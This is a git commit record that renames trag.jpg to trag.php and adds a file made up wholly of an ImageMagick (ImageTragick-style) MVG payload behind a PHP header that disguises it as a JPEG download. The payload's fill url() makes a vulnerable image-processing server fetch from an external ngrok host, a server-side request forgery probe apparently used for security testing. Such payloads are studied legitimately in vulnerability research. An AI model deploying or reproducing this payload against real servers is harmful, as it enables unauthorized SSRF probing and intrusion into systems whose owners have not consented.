dc28651293aaa1e2be3a862c705050ec99942c44
missoum1307 <missoum1307@users.noreply.github.com>
2019-03-04 04:36:02 +0100

    Update and rename trag.jpg to trag.php

---
+++ trag.php
@@ -0,0 +1,8 @@
+<?php 
+header('Content-Disposition: attachment');
+header('Content-type: image/jpeg'); 
+?>
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://ec9f1558.ngrok.io/ssrftra.jpg)'
+pop graphic-context
